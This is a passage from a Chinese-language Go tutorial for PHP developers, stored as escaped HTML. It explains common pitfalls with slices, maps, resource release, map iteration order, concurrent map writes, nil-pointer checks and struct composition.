error)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;paramDemo[&lt;span&gt;&quot;a&quot;&lt;/span&gt;] = &lt;span&gt;&quot;b&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; paramDemo, &lt;span&gt;nil&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// [Running] go run &quot;.../demo/main.go&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// main.paramDemo 1 map[a:a]&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// main.paramDemo 2 map[a:b] &lt;/span&gt;&lt;/span&gt;&lt;span&gt;&amp;lt;------- 值被修改&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;blockquote data-line=&quot;322&quot;&gt;&lt;p data-line=&quot;322&quot;&gt;&lt;span&gt;为什么？&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;pre&gt;&lt;code data-line=&quot;324&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;答：Go语言都是值传递，浅复制过程，slice和map底层的类型是个结构体，实际存储值的类型是个指针。&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code data-line=&quot;328&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;// versions/1.13.8/src/runtime/slice.go&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// slice源码结构体&lt;/span&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; slice &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;    array unsafe.Pointer &lt;span&gt;// 实际存储值的类型是个指针&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;len&lt;/span&gt;   &lt;span&gt;int&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;cap&lt;/span&gt;   &lt;span&gt;int&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// versions/1.13.8/src/runtime/map.go&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// map源码结构体&lt;/span&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; hmap &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;    count     &lt;span&gt;int&lt;/span&gt;&lt;br/&gt;    flags     &lt;span&gt;uint8&lt;/span&gt;&lt;br/&gt;    B         &lt;span&gt;uint8&lt;/span&gt;&lt;br/&gt;    noverflow &lt;span&gt;uint16&lt;/span&gt;&lt;br/&gt;    hash0     &lt;span&gt;uint32&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;    buckets    unsafe.Pointer &lt;span&gt;// 实际存储值的类型是个指针&lt;/span&gt;&lt;br/&gt;    oldbuckets unsafe.Pointer&lt;br/&gt;    nevacuate  &lt;span&gt;uintptr&lt;/span&gt;  &lt;br/&gt;&lt;br/&gt;    extra *mapextra&lt;br/&gt;}&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;blockquote data-line=&quot;354&quot;&gt;&lt;p data-line=&quot;354&quot;&gt;&lt;span&gt;怎么办？&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;pre&gt;&lt;code data-line=&quot;356&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;答：深拷贝，开辟一块新内存，指针指向新内存地址，并把原有的值复制过去。如下：&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code data-line=&quot;360&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; &lt;span&gt;&quot;fmt&quot;&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;paramDemo := []&lt;span&gt;int32&lt;/span&gt;{&lt;span&gt;1&lt;/span&gt;}&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;main.paramDemo 1&quot;&lt;/span&gt;, paramDemo)&lt;br/&gt;&lt;span&gt;// 初始化新空间&lt;/span&gt;&lt;br/&gt;paramDemoCopy := &lt;span&gt;make&lt;/span&gt;([]&lt;span&gt;int32&lt;/span&gt;, &lt;span&gt;len&lt;/span&gt;(paramDemo))&lt;br/&gt;&lt;span&gt;// 深拷贝&lt;/span&gt;&lt;br/&gt;&lt;span&gt;copy&lt;/span&gt;(paramDemoCopy, paramDemo)&lt;br/&gt;demo(paramDemoCopy)&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;main.paramDemo 2&quot;&lt;/span&gt;, paramDemo)&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;demo&lt;/span&gt;&lt;span&gt;(paramDemo []&lt;span&gt;int32&lt;/span&gt;)&lt;/span&gt; &lt;span&gt;([]&lt;span&gt;int32&lt;/span&gt;, error)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;paramDemo[&lt;span&gt;0&lt;/span&gt;] = &lt;span&gt;2&lt;/span&gt;&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; paramDemo, &lt;span&gt;nil&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// [Running] go run &quot;.../demo/main.go&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// main.paramDemo 1 [1]&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// main.paramDemo 2 [1]&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;387&quot;&gt;&lt;span&gt;3. 资源使用完毕，记得释放资源或回收资源&lt;/span&gt;&lt;/h2&gt;&lt;pre&gt;&lt;code data-line=&quot;389&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;github.com/gomodule/redigo/redis&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;var&lt;/span&gt; RedisPool *redis.Pool&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;init&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;RedisPool = NewRedisPool()&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;redisConn := RedisPool.Get()&lt;br/&gt;&lt;span&gt;// 记得defer释放资源&lt;/span&gt;&lt;br/&gt;&lt;span&gt;defer&lt;/span&gt; redisConn.Close()&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;NewRedisPool&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; *&lt;span&gt;redis&lt;/span&gt;.&lt;span&gt;Pool&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;// 略...&lt;/span&gt;&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; &amp;amp;redis.Pool{}&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;blockquote data-line=&quot;415&quot;&gt;&lt;p data-line=&quot;415&quot;&gt;&lt;span&gt;为什么？&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;pre&gt;&lt;code data-line=&quot;417&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;答：避免资源被无效的持有，浪费资源和增加了资源的连接数。其次如果是归还连接池也减少新建资源的开销。&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;资源连接数线性增长&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;如果一直持有，资源服务端也有超时时间&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 data-line=&quot;424&quot;&gt;&lt;span&gt;4. 不要依赖map遍历的顺序&lt;/span&gt;&lt;/h2&gt;&lt;p data-line=&quot;426&quot;&gt;&lt;span&gt;以往PHP的”Map“(关联数组)不管遍历多少次，元素的顺序都是稳定不变的，如下：&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;427&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;&amp;lt;?php&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;$demoMap&lt;/span&gt; = &lt;span&gt;array&lt;/span&gt;(&lt;br/&gt;    &lt;span&gt;&#x27;a&#x27;&lt;/span&gt; =&amp;gt; &lt;span&gt;&#x27;a&#x27;&lt;/span&gt;,&lt;br/&gt;&lt;span&gt;&#x27;b&#x27;&lt;/span&gt; =&amp;gt; &lt;span&gt;&#x27;b&#x27;&lt;/span&gt;,&lt;br/&gt;    &lt;span&gt;&#x27;c&#x27;&lt;/span&gt; =&amp;gt; &lt;span&gt;&#x27;c&#x27;&lt;/span&gt;,&lt;br/&gt;    &lt;span&gt;&#x27;d&#x27;&lt;/span&gt; =&amp;gt; &lt;span&gt;&#x27;d&#x27;&lt;/span&gt;,&lt;br/&gt;    &lt;span&gt;&#x27;e&#x27;&lt;/span&gt; =&amp;gt; &lt;span&gt;&#x27;e&#x27;&lt;/span&gt;,&lt;br/&gt;);&lt;br/&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;$demoMap&lt;/span&gt; &lt;span&gt;as&lt;/span&gt; &lt;span&gt;$v&lt;/span&gt;) {&lt;br/&gt;    var_dump(&lt;span&gt;&quot;v &lt;span&gt;{$v}&lt;/span&gt;&quot;&lt;/span&gt;);&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 第一次执行&lt;/span&gt;&lt;br/&gt;[Running] php &lt;span&gt;&quot;.../php/demo.php&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;string&lt;/span&gt;(&lt;span&gt;3&lt;/span&gt;) &lt;span&gt;&quot;v a&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;string&lt;/span&gt;(&lt;span&gt;3&lt;/span&gt;) &lt;span&gt;&quot;v b&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;string&lt;/span&gt;(&lt;span&gt;3&lt;/span&gt;) &lt;span&gt;&quot;v c&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;string&lt;/span&gt;(&lt;span&gt;3&lt;/span&gt;) &lt;span&gt;&quot;v d&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;string&lt;/span&gt;(&lt;span&gt;3&lt;/span&gt;) &lt;span&gt;&quot;v e&quot;&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 第N次执行&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 遍历结果的顺序都是稳定不变的&lt;/span&gt;&lt;br/&gt;[Running] php &lt;span&gt;&quot;.../php/demo.php&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;string&lt;/span&gt;(&lt;span&gt;3&lt;/span&gt;) &lt;span&gt;&quot;v a&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;string&lt;/span&gt;(&lt;span&gt;3&lt;/span&gt;) &lt;span&gt;&quot;v b&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;string&lt;/span&gt;(&lt;span&gt;3&lt;/span&gt;) &lt;span&gt;&quot;v c&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;string&lt;/span&gt;(&lt;span&gt;3&lt;/span&gt;) &lt;span&gt;&quot;v d&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;string&lt;/span&gt;(&lt;span&gt;3&lt;/span&gt;) &lt;span&gt;&quot;v e&quot;&lt;/span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-line=&quot;459&quot;&gt;&lt;span&gt;但是Go语言里就不一样了，如下：&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;460&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; &lt;span&gt;&quot;fmt&quot;&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;var&lt;/span&gt; demoMap &lt;span&gt;map&lt;/span&gt;[&lt;span&gt;string&lt;/span&gt;]&lt;span&gt;string&lt;/span&gt; = &lt;span&gt;map&lt;/span&gt;[&lt;span&gt;string&lt;/span&gt;]&lt;span&gt;string&lt;/span&gt;{&lt;br/&gt;&lt;span&gt;&quot;a&quot;&lt;/span&gt;: &lt;span&gt;&quot;a&quot;&lt;/span&gt;,&lt;br/&gt;&lt;span&gt;&quot;b&quot;&lt;/span&gt;: &lt;span&gt;&quot;b&quot;&lt;/span&gt;,&lt;br/&gt;&lt;span&gt;&quot;c&quot;&lt;/span&gt;: &lt;span&gt;&quot;c&quot;&lt;/span&gt;,&lt;br/&gt;&lt;span&gt;&quot;d&quot;&lt;/span&gt;: &lt;span&gt;&quot;d&quot;&lt;/span&gt;,&lt;br/&gt;&lt;span&gt;&quot;e&quot;&lt;/span&gt;: &lt;span&gt;&quot;e&quot;&lt;/span&gt;,&lt;br/&gt;}&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; _, v := &lt;span&gt;range&lt;/span&gt; demoMap {&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;v&quot;&lt;/span&gt;, v)&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 第一次执行&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// [Running] go run &quot;.../demo/main.go&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// v a&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// v b&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// v c&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// v d&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// v e&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 第二次执行&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// &lt;/span&gt;&lt;/span&gt;&lt;span&gt;遍历结果，元素顺序发生了改变&lt;/span&gt;&lt;span&gt;&lt;br/&gt;&lt;span&gt;// [Running] go run &quot;.../demo/main.go&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// v e&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// v a&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// v b&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// v c&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// v d&lt;/span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;blockquote data-line=&quot;496&quot;&gt;&lt;p data-line=&quot;496&quot;&gt;&lt;span&gt;为什么？&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;pre&gt;&lt;code data-line=&quot;498&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;答：底层实现都是数组+类似拉链法。&lt;br/&gt;1. hash函数无序写入&lt;br/&gt;2. 成倍扩容&lt;br/&gt;3. 等量扩容&lt;br/&gt;都决定了map本来就是无序的，所以Go语言为了避免开发者依赖元素顺序，每次遍历的时候都是随机了一个索引起始值。然后PHP通过额外的内存空间维护了map元素的顺序。&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;506&quot;&gt;&lt;span&gt;5. 不要并发写map&lt;/span&gt;&lt;/h2&gt;&lt;pre&gt;&lt;code data-line=&quot;508&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;testing&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;BenchmarkDemo&lt;/span&gt;&lt;span&gt;(b *testing.B)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;var&lt;/span&gt; demoMap &lt;span&gt;map&lt;/span&gt;[&lt;span&gt;string&lt;/span&gt;]&lt;span&gt;string&lt;/span&gt; = &lt;span&gt;map&lt;/span&gt;[&lt;span&gt;string&lt;/span&gt;]&lt;span&gt;string&lt;/span&gt;{&lt;br/&gt;&lt;span&gt;&quot;a&quot;&lt;/span&gt;: &lt;span&gt;&quot;a&quot;&lt;/span&gt;,&lt;br/&gt;&lt;span&gt;&quot;b&quot;&lt;/span&gt;: &lt;span&gt;&quot;b&quot;&lt;/span&gt;,&lt;br/&gt;}&lt;br/&gt;&lt;span&gt;// 模拟并发写map&lt;/span&gt;&lt;br/&gt;b.RunParallel(&lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(pb *testing.PB)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; pb.Next() {&lt;br/&gt;demoMap[&lt;span&gt;&quot;a&quot;&lt;/span&gt;] = &lt;span&gt;&quot;aa&quot;&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;})&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// BenchmarkDemo&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// &lt;/span&gt;&lt;/span&gt;&lt;span&gt;fatal error: concurrent map writes&lt;/span&gt;&lt;span&gt;&lt;br/&gt;// fatal error: concurrent map writes&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;blockquote data-line=&quot;533&quot;&gt;&lt;p data-line=&quot;533&quot;&gt;&lt;span&gt;为什么？&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;pre&gt;&lt;code data-line=&quot;535&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;答：&lt;/span&gt;&lt;span&gt;并发不安全，触发panic：“fatal error: concurrent map writes”。&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code data-line=&quot;539&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;// go version 1.13.8源码&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// hashWriting 值为 4&lt;/span&gt;&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; h.flags&amp;amp;hashWriting != &lt;span&gt;0&lt;/span&gt; {&lt;br/&gt;throw(&lt;span&gt;&quot;concurrent map read and map write&quot;&lt;/span&gt;)&lt;br/&gt;}&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;547&quot;&gt;&lt;span&gt;6. 注意判断指针类型不为空&lt;/span&gt;&lt;code&gt;&lt;span&gt;nil&lt;/span&gt;&lt;/code&gt;&lt;span&gt;，再操作&lt;/span&gt;&lt;/h2&gt;&lt;pre&gt;&lt;code data-line=&quot;549&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;fmt&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;log&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;net/http&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;resp, err := http.Get(&lt;span&gt;&quot;https://www.example.com&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; resp.StatusCode != http.StatusOK || err != &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;// 当 resp为nil时 会触发panic&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 当 resp.StatusCode != http.StatusOK 时err可能为nil 触发panic&lt;/span&gt;&lt;br/&gt;log.Printf(&lt;span&gt;&quot;err: %s&quot;&lt;/span&gt;, err.Error())&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// [Running] go run &quot;.../demo/main.go&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// &lt;/span&gt;&lt;/span&gt;&lt;span&gt;panic: runtime error: invalid memory address or nil pointer dereference&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code data-line=&quot;573&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;fmt&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;log&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;net/http&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;// 模拟请求业务code&lt;/span&gt;&lt;br/&gt;resp, err := http.Get(&lt;span&gt;&quot;https://www.example.com&quot;&lt;/span&gt;)&lt;br/&gt;fmt.Println(resp, err)&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; err != &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;// 报错并记录异常日志&lt;/span&gt;&lt;br/&gt;log.Printf(&lt;span&gt;&quot;err: %s&quot;&lt;/span&gt;, err.Error())&lt;br/&gt;&lt;span&gt;return&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;span&gt;// 模拟业务code不为成功的code&lt;/span&gt;&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; resp != &lt;span&gt;nil&lt;/span&gt; &amp;amp;&amp;amp; resp.StatusCode != http.StatusOK {&lt;br/&gt;&lt;span&gt;// 报错并记录异常日志&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;598&quot;&gt;&lt;span&gt;7.  Go语言不支持继承，但是有合成复用&lt;/span&gt;&lt;/h2&gt;&lt;pre&gt;&lt;code data-line=&quot;600&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;abstract&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;AbstractClassDemo&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;// 抽象方法&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;abstract&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;function&lt;/span&gt; &lt;span&gt;demoFun&lt;/span&gt;()&lt;/span&gt;;&lt;br/&gt;    &lt;br/&gt;    &lt;span&gt;// 公有方法&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;function&lt;/span&gt; &lt;span&gt;publicFun&lt;/span&gt;()&lt;br/&gt;    &lt;/span&gt;{&lt;br/&gt;        &lt;span&gt;$this&lt;/span&gt;-&amp;gt;demoFun();&lt;br/&gt;    }&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;ClassDemo&lt;/span&gt; &lt;span&gt;extends&lt;/span&gt; &lt;span&gt;AbstractClassDemo&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;function&lt;/span&gt; &lt;span&gt;demoFun&lt;/span&gt;()&lt;br/&gt;    &lt;/span&gt;{&lt;br/&gt;        var_dump(&lt;span&gt;&quot;Demo&quot;&lt;/span&gt;);&lt;br/&gt;    }&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;(&lt;span&gt;new&lt;/span&gt; ClassDemo())-&amp;gt;demoFun();&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// [Running] php &quot;.../php/demo.php&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// string(4) &quot;Demo&quot;&lt;/span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code data-line=&quot;627&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;fmt&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;//基础结构体&lt;/span&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; Base &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// Base的DemoFun&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;(b *Base)&lt;/span&gt; &lt;span&gt;DemoFun&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;Base&quot;&lt;/span&gt;)&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;(b *Base)&lt;/span&gt; &lt;span&gt;PublicFun&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;b.DemoFun()&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; Demo &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;// 合成复用Base&lt;/span&gt;&lt;br/&gt;Base&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// Demo的DemoFun&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;(d *Demo)&lt;/span&gt; &lt;span&gt;DemoFun&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;Demo&quot;&lt;/span&gt;)&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;// 执行&lt;/span&gt;&lt;br/&gt;(&amp;amp;Demo{}).PublicFun()&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// [Running] go run &quot;.../demo/main.go&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// Base &amp;lt;------ 注意此处执行的是被合成复用的结构体的方法&lt;/span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h1 data-line=&quot;666&quot;&gt;&lt;span&gt;进阶使用&lt;/span&gt;&lt;/h1&gt;&lt;ol class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;热加载工具bee&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;Goroutine并发控制之sync.WaitGroup包的使用&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;子Goroutine超时控制之context.Context包的使用&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;并发安全的map之sync.Map包的使用&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;减少GC压力之sync.Pool包的使用&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&g